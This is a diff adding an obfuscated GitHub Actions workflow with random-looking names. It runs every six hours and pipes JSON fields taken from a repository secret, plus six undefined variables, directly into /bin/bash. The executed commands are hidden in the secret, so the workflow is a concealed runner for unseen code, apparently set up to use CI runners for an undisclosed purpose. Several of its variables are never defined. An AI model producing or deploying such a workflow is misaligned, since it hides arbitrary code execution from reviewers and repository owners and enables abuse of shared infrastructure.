@@ -1,0 +1,25 @@
+name: xupingzhi4321
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '18 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xupingzhi4321
+        env:
+          h8097: ${{ secrets.h8097 }}
+        run: |
+          echo $h8097 | jq -r .orc7 | /bin/bash
+          echo $lvzta4 | jq -r .hjzj671 | /bin/bash
+          echo $fhhk69507 | jq -r .sqp549 | /bin/bash
+          echo $uxqjb43904 | jq -r .cp7 | /bin/bash
+          echo $i9106 | jq -r .ohkmg769 | /bin/bash
+          echo $c25408 | jq -r .xzk9029 | /bin/bash
+          echo $jes48378 | jq -r .xs5 | /bin/bash
+
